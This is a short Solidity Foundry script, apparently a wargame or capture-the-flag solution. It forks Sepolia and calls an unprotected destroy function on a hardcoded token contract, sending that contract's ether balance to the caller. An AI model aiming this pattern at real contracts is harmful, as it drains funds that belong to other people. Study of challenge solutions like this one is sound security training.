// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address recoveryContractAddress = 0x15CdF2D390b7298A75E18744dEC097A7c962a5E7;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        console.log("Contract Balance:", recoveryContractAddress.balance);

        ISimpleToken(recoveryContractAddress).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }
}
